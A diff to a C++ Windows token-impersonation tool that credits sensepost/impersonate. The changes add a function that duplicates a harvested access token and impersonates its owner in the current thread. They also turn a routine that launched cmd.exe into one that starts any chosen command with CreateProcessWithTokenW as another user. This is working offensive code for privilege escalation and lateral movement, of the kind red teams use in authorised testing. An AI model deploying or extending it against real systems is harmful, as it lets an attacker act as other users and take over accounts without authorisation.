@@ -12,7 +12,7 @@
 #include <exception>
 
 // -----------------------------------------------------------------------------------------------------------------
-// A lot of this code is stolen from https://github.com/sensepost/impersonate
+// Some of this code is from https://github.com/sensepost/impersonate
 // ------------------------------------------------------------------------------------------------------------------
 
 #define STATUS_SUCCESS               ((NTSTATUS)0x00000000L)
@@ -83,9 +83,30 @@ typedef struct _Token {
 
 // ------------------------------------------------------------------------------------------------------------------
 
-void run_cmd_with_token(Token* tokenToUse)
+BOOL impersonate(Token* tokenToUse)
 {
-    // Duplicate the token
+    SECURITY_IMPERSONATION_LEVEL seImpersonateLevel = SecurityImpersonation;
+    HANDLE pNewToken;
+    if (!DuplicateTokenEx(tokenToUse->tokenHandle, TOKEN_ALL_ACCESS, NULL, seImpersonateLevel, tokenToUse->tokenType, &pNewToken))
+    {
+        DWORD LastError = GetLastError();
+        wprintf(L"[!] ERROR: Could not duplicate token: %d\n", LastError);
+        return FALSE; // impersonation state did not change
+    }
+
+    printf("[*] Impersonating %ws in current thread\n", tokenToUse->tokenUsername);
+             
+    if (!ImpersonateLoggedOnUser(pNewToken))
+    {
+        printf("[!] ERROR: Impersonation failed: %d\n", GetLastError());
+    }
+
+    CloseHandle(pNewToken);
+    return TRUE;
+}
+
+void run_cmd(Token* tokenToUse, const wchar_t* cmdToRun)
+{
     SECURITY_IMPERSONATION_LEVEL seImpersonateLevel = SecurityImpersonation;
     HANDLE pNewToken;
     if (!DuplicateTokenEx(tokenToUse->tokenHandle, TOKEN_ALL_ACCESS, NULL, seImpersonateLevel, tokenToUse->tokenType, &pNewToken))
@@ -95,31 +116,13 @@ void run_cmd_with_token(Token* tokenToUse)
         return;
     }
 
-    if (tokenToUse->tokenType == TokenImpersonation)
+    STARTUPINFO si = {};
+    PROCESS_INFORMATION pi = {};
+    if (!CreateProcessWithTokenW(pNewToken, LOGON_NETCREDENTIALS_ONLY, cmdToRun, NULL, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi))
     {
-        printf("[*] ImpersonationToken chosen -> elevating current process to %ws\n", tokenToUse->tokenUsername);
-        
-        if (!SetThreadToken(NULL, pNewToken))
-        {
-            printf("[!] ERROR: Could not set thread token: %d\n", GetLastError());
-        }
-        /*
-        if (!ImpersonateLoggedOnUser(pNewToken))
-        {
-            printf("[!] ERROR: Impersonation failed: %d\n", GetLastError());
-        }
-        */
-    }   
-    else if (tokenToUse->tokenType == TokenPrimary)
-    {
-        printf("[*] PrimaryToken chosen -> starting cmd.exe as %ws\n", tokenToUse->tokenUsername);
-        STARTUPINFO si = {};
-        PROCESS_INFORMATION pi = {};
-        if (!CreateProcessWithTokenW(pNewToken, LOGON_NETCREDENTIALS_ONLY, L"C:\\Windows\\System32\\cmd.exe", NULL, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi))
-        {
-            printf("[!] ERROR: Could not create process with token: %d\n", GetLastError());
-        }
+        printf("[!] ERROR: Could not create process with token: %d\n", GetLastError());
     }
+
     CloseHandle(pNewToken);
 }
 
@@ -187,7 +190,7 @@ void get_token_information(Token* token)
     DWORD token_info;
     SID_NAME_USE sid;
 
-    token->tokenUsername = (wchar_t*)L"UNKOWN/EMPTY";
+    token->tokenUsername = (wchar_t*)L"UNKNOWN / EMPTY";
     if (!GetTokenInformation(token->tokenHandle, TokenUser, NULL, 0, &token_info))
     {
         PTOKEN_USER TokenStatisticsInformation = (PTOKEN_USER)GlobalAlloc(GPTR, token_info); 
@@ -259,7 +262,7 @@ void list_available_tokens(HMODULE hNtdll, Token* foundTokens)
             Token t = foundTokens[j];
             if ((t.tokenType == currToken.tokenType)
                 && (wcscmp(t.tokenUsername, currToken.tokenUsername) == 0)
-                && t.tokenHandleInfo.ProcessId == currToken.tokenHandleInfo.ProcessId) // TODO: revisit when adding more attrs to token type
+                && t.tokenHandleInfo.ProcessId == currToken.tokenHandleInfo.ProcessId) 
             {
                 // Token with same attributes exists
                 tokenAlreadyEnumerated = TRUE;
